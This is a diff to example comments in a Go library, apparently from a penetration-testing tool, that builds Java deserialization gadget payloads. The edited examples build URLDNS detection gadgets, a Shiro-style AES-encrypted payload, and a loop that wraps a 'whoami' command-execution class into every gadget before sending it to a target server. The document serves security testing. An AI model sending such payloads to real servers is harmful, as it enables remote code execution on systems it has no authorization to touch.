@@ -964,7 +964,7 @@ func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
 // url, token, _ = risk.NewDNSLogDomain()
 // javaObject, _ = yso.GetURLDNSJavaObject(url)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
+// // 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
 // res,err = risk.CheckDNSLogByToken(token)
 //
 //	if err {
@@ -994,7 +994,7 @@ func GetURLDNSJavaObject(url string) (*JavaObject, error) {
 // url, token, _ = risk.NewDNSLogDomain()
 // javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
+// // 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
 // res,err = risk.CheckDNSLogByToken(token)
 //
 //	if err {
@@ -1024,7 +1024,7 @@ func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
 // ```
 // javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
 // gadgetBytes,_ = yso.ToBytes(javaObject)
-// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
+// // 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
 // ```
 func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 	return GenerateGadget(string(GadgetFindClassByBomb), "class", map[string]string{
@@ -1049,7 +1049,7 @@ func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
 // iv = []byte(ramdstr(16))
 // cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
 // payload = codec.EncodeBase64(append(iv, cipherText...))
-// 发送 payload
+// // 发送 payload
 // ```
 func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 	return GenerateGadget(string(GadgetSimplePrincipalCollection))
@@ -1065,19 +1065,17 @@ func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
 //
 // Example:
 // ```
-// allGadgets := yso.GetAllGadget()
-//
-//	for _, gadget := range allGadgets {
-//	    switch g := gadget.(type) {
-//	    case func(...GenClassOptionFun) (*JavaObject, error):
-//	        // 处理模板实现的Gadget
-//	        obj, err := g(yso.useRuntimeExecEvilClass("whoami"))
-//	    case func(string) (*JavaObject, error):
-//	        // 处理命令执行类型的Gadget
-//	        obj, err := g("whoami")
-//	    }
-//	}
-//
+// allGadgets = yso.GetAllGadget()
+// for _, gadget := range allGadgets {
+//     // 每个元素都是 gadget 生成函数：模板型接收 ...GenClassOptionFun，命令型接收命令字符串。
+//     // 此处演示模板型调用，命令型可改为 gadget("whoami")。
+//     obj, err := gadget(yso.useRuntimeExecEvilClass("whoami"))
+//     if err != nil {
+//         continue
+//     }
+//     objBytes, _ = yso.ToBytes(obj)
+//     // 发送 objBytes
+// }
 // ```
 func GetAllGadget() []interface{} {
 	var allGadget []any
